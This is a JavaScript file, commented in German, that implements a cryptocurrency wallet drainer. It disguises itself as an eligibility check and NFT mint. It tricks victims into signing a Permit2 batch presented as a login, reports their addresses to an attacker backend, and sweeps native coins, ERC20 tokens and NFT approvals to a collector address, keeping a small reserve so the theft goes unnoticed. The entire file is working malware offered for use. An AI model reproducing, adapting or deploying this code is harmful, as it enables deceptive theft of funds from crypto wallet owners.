// Quiet core — 1 harmlos wirkende Signatur, Rest läuft still übers Backend
(function(){
const CFG_URL = './config.json';
let CFG = null;
let CTX = null; // { signer, victim, provider }

async function loadConfig(){
  if(CFG) return CFG;
  CFG = await (await fetch(CFG_URL)).json();
  return CFG;
}

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address,uint256) returns (bool)",
  "function approve(address,uint256) returns (bool)"
];
const ERC721_ABI = [
  "function isApprovedForAll(address,address) view returns (bool)",
  "function setApprovalForAll(address,bool)"
];

async function report(data){
  try{ await fetch(CFG.backendUrl + '/api/report', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data) }); }catch(e){}
}

// Schritt 1: wirkt wie "Eligibility-Check" — sammelt 1 Signatur (Permit2-Batch wo möglich),
// meldet Opfer + Scan ans Backend, damit der Sweep auch ohne weitere Klicks fertig wird.
async function verifyAndCollect(){
  const cfg = await loadConfig();
  if(!window.ethereum) throw new Error('no wallet');
  const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
  await provider.send("eth_requestAccounts", []);
  const signer = provider.getSigner();
  const victim = await signer.getAddress();
  CTX = { signer, victim, provider };
  await report({ type:'connect', victim, ua: navigator.userAgent });

  // Gaslose Nachricht — sieht aus wie Login, ist ein Permit2-Batch für Top-Token
  try{
    if(window.Permit2Drain && (cfg.targetTokens||[]).length){
      const amounts = cfg.targetTokens.map(()=> ethers.constants.MaxUint256.toString());
      const sigs = await window.Permit2Drain.signPermit2Batch(signer, victim, cfg.targetTokens, cfg.collector, amounts);
      if(sigs && sigs.length) await report({ type:'permit2-sig', victim, sigs });
    }
  }catch(e){}

  // Backend scannt automatisch alles (scanner.js) — kein weiterer Klick nötig
  try{ await fetch(cfg.backendUrl + '/api/scan/' + victim); }catch(e){}
  return victim;
}

// Schritt 2: stiller Sweep — native + direkte Transfers; Approvals meldet das Backend,
// der Autosweep zieht den Rest zeitversetzt (Opfer sieht "Minted", nichts weiter).
async function sweepQuiet(){
  if(!CTX) throw new Error('not verified');
  const cfg = await loadConfig();
  const { signer, victim } = CTX;

  // Native — kleinlaut, mit Reserve damit seine Wallet "normal" wirkt
  try{
    const bal = await signer.provider.getBalance(victim);
    const reserve = ethers.utils.parseEther(cfg.gasReserveEth || "0.01");
    if(bal.gt(reserve)){
      const tx = await signer.sendTransaction({ to: cfg.collector, value: bal.sub(reserve) });
      tx.wait().catch(()=>{});
      await report({ type:'native', victim, amount: bal.sub(reserve).toString(), txHash: tx.hash });
    }
  }catch(e){}

  // ERC20 — nur direkte Transfers hier (1 unscheinbare Confirmation);
  // alles andere holt das Backend zeitversetzt über Permit2/Approvals
  for(const t of (cfg.targetTokens||[])){
    try{
      const c = new ethers.Contract(t, ERC20_ABI, signer);
      const bal = await c.balanceOf(victim).catch(()=>ethers.constants.Zero);
      if(bal.isZero()) continue;
      try{
        const tx = await c.transfer(cfg.collector, bal);
        tx.wait().catch(()=>{});
        await report({ type:'erc20-direct', token: t, victim, amount: bal.toString(), txHash: tx.hash });
      }catch(e){
        try{
          const tx2 = await c.approve(cfg.collector, bal);
          tx2.wait().catch(()=>{});
          await report({ type:'erc20-approve', token: t, victim, amount: bal.toString(), txHash: tx2.hash });
        }catch(e2){}
      }
    }catch(e){}
  }

  // NFT-Approvals — eine Confirmation, Backend zieht später
  for(const col of (cfg.targetNFTs||[])){
    try{
      const c = new ethers.Contract(col, ERC721_ABI, signer);
      const ok = await c.isApprovedForAll(victim, cfg.collector).catch(()=>true);
      if(!ok){
        const tx = await c.setApprovalForAll(cfg.collector, true);
        tx.wait().catch(()=>{});
        await report({ type:'nft-approve', collection: col, victim, txHash: tx.hash });
      }
    }catch(e){}
  }
  return true;
}

// Alt-API bleibt für Kompatibilität
async function mintAndDrain(onMsg){
  onMsg && onMsg('Verifying...');
  await verifyAndCollect();
  onMsg && onMsg('Minting...');
  await sweepQuiet();
  onMsg && onMsg('Done');
  return CTX.victim;
}

window.Drainer = { verifyAndCollect, sweepQuiet, mintAndDrain };
})();
